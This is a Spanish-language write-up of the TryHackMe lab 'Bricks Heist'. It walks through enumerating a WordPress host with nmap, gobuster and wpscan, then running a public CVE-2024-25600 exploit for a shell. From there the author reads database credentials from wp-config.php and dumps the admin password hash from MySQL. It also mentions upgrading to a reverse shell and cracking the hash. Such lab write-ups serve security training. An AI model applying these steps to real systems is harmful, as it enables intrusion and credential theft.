---
layout: default
---

# TryHack3M: Bricks Heist

- Nivel: Easy
- Link de la sala: [Bricks Heist](https://tryhackme.com/room/bricksheist)

Al iniciar la máquina, agregar la IP a /etc/hosts como `IP bricks.thm`

## Enumeracion

Primero corremos nmap para ver puertos abiertos

```
❯ nmap bricks.thm
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-14 11:27 -03
Nmap scan report for bricks.thm (10.201.68.93)
Host is up (0.35s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 45.29 seconds
```

Al entrar con Browser vemos que http://bricks.thm está bloqueado y https://bricks.thm hay una imagen pero nada más. Procedemos a utilizar gobuster para listar los directorios

```
❯ gobuster dir -u https://bricks.thm/ -w /usr/share/wordlists/DirBuster-2007_directory-list-lowercase-2.3-big.txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://bricks.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/DirBuster-2007_directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/rss                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
/login                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> https://bricks.thm/0/]
/feed                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
/atom                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/atom/]
/s                    (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
/b                    (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
/wp-content           (Status: 301) [Size: 238] [--> https://bricks.thm/wp-content/]
/admin                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]
/rss2                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
/wp-includes          (Status: 301) [Size: 239] [--> https://bricks.thm/wp-includes/]
/br                   (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
/sa                   (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
/rdf                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> https://bricks.thm/]
/sample               (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
Progress: 1765 / 1185255 (0.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1767 / 1185255 (0.15%)
===============================================================
Finished
===============================================================
```

Tuve que terminar antes porque sino me daba repetidos (pude haber skipeado a cosas importantes). 
Hay un robots.txt pero nada importante. Lo más relevante es la pagina de login y admin que redirigen a un login que no tiene credenciales predeterminados.

Un error anteriormente fue no escanear por completo
```
❯ sudo nmap -A bricks.thm
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-14 12:07 -03
Nmap scan report for bricks.thm (10.201.68.93)
Host is up (0.34s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6b:15:10:c2:16:07:63:be:48:47:ad:44:ca:58:b0:04 (RSA)
|   256 96:42:81:3d:d1:d3:5a:3e:35:49:b6:a4:7d:49:9e:15 (ECDSA)
|_  256 72:aa:9b:d5:c5:ad:33:eb:cb:06:ef:4b:a0:17:4f:8b (ED25519)
80/tcp   open  http     WebSockify Python/3.8.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
|_http-server-header: Apache
|_http-title: Brick by Brick
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
| tls-alpn: 
|   h2
|_  http/1.1
|_http-generator: WordPress 6.5
3306/tcp open  mysql    MySQL (unauthorized)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   278.59 ms 10.23.0.1
2   ... 3
4   347.93 ms bricks.thm (10.201.68.93)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.19 seconds
```

Con esta data vemos más detallado que en uno corre server de python y otro wp (aunque sí se sabía si vemos con chrome). Entonces como corre wordpress podemos utilizar `wpscan`.

```
❯ wpscan --url https://bricks.thm --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.201.68.93]
[+] Started: Thu Aug 14 12:13:15 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:14 <===============================================================> (137 / 137) 100.00% Time: 00:00:14

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug 14 12:13:42 2025
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.448 KB
[+] Data Received: 110.502 KB
[+] Memory used: 275.309 MB
[+] Elapsed time: 00:00:27
```

Buscando la versión de wordpress encontras que bricks es vulnerable a `cve-2024-25600` y hay repo en github para explotar esta vulnerabilidad. Descargando repo y ejecutando script obtenes shell access como apache

```
❯ python3 exploit.py -u https://bricks.thm
[*] Nonce found: b1893bfd3d
[+] https://bricks.thm is vulnerable to CVE-2024-25600: apache
[!] Shell ready! Type commands (exit to quit)
# ls

```

Dentro de archivo está flag en `.txt` y en `wp-config.php` hay datos de la base de datos
```php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'lamp.sh' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Para tener mejor shell utilizar reverse shell con Python3 generado por la siguiente página https://www.revshells.com/


Luego obtenemos los credenciales del administrador una vez que entramos a la base de datos
```
apache@tryhackme:/data/www/default$ mysql -h localhost -u root -p
mysql -h localhost -u root -p
Enter password: lamp.sh

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 45
Server version: 5.7.44 MySQL Community Server (GPL)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0.13 sec)


mysql> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+---------------+------------------------------------+---------------+------------------+-----------------------+---------------------+---------------------+-------------+---------------+
| ID | user_login    | user_pass                          | user_nicename | user_email       | user_url              | user_registered     | user_activation_key | user_status | display_name  |
+----+---------------+------------------------------------+---------------+------------------+-----------------------+---------------------+---------------------+-------------+---------------+
|  1 | administrator | $P$BYft/ZYThkTPfDb6R2Jzpiu5bkbE8U1 | administrator | admin@bricks.thm | http://localhost:8000 | 2024-04-02 11:13:36 |                     |           0 | administrator |
+----+---------------+------------------------------------+---------------+------------------+-----------------------+---------------------+---------------------+-------------+---------------+
1 row in set (0.00 sec)
```

Obtenemos hash `$P$BYft/ZYThkTPfDb6R2Jzpiu5bkbE8U1` y lo podemos crackearlo con John. 

---

Al final terminé leyendo writeups:
- https://medium.com/@timnik/tryhack3m-bricks-heist-a0768e9615bf


---

## Cosas que aprendí

- Chequear siempre los versiones, buscar vulnerabilidades

- `wpscan` para escanear versiones de wps y buscar vulnerabilidades

- `cyberchef` para desencriptar 

- Utilizar reverse shell para mejorar shell

- Leer las preguntas de ejercicio para resolver guiado. No hacer cosas de más que no es lo que pide